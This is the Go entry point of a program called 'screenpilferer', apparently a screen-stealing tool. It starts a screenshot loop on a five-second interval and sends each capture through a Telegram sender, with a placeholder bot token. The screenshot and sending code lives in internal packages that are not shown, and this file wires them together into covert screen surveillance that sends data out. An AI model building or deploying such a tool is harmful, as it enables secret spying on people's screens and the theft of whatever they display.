package main

import (
	"time"

	"github.com/foreverNP/screenpilferer/internal/screenshot"
	"github.com/foreverNP/screenpilferer/internal/sender"
)

const (
	token = "your_token_here"
	dur   = 5 * time.Second
)

func main() {
	sndr := sender.NewTgSender(token)
	sh := screenshot.NewShooter(dur, sndr, false)

	sh.Start()
}
